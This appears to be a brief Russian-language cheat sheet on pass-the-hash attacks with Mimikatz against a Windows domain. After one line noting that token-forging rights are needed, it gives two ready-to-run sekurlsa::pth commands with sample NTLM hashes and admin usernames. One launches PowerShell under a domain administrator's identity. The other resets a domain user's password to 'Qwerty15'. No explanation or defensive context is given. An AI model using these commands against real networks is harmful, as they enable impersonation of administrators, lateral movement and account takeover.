Входные данные:
- требует права для фальсификации токена;

## Запускаем удаленный powershell.
sekurlsa::pth /domain:company.ru /user:kstepanovAdm /ntlm:39aced871bfb9485b15c0ddcd3b456f3 /run:"powershell.exe"

## Меняем пароль пользователя в домене. Пароль должен удовлетворять текущей парольной политике!
sekurlsa::pth /domain:company.ru /user:eborisenkoAdm /ntlm:84a09c7fe2da7625051ed8dbae888073 /run:"net user eborisenkoAdm Qwerty15 /domain"

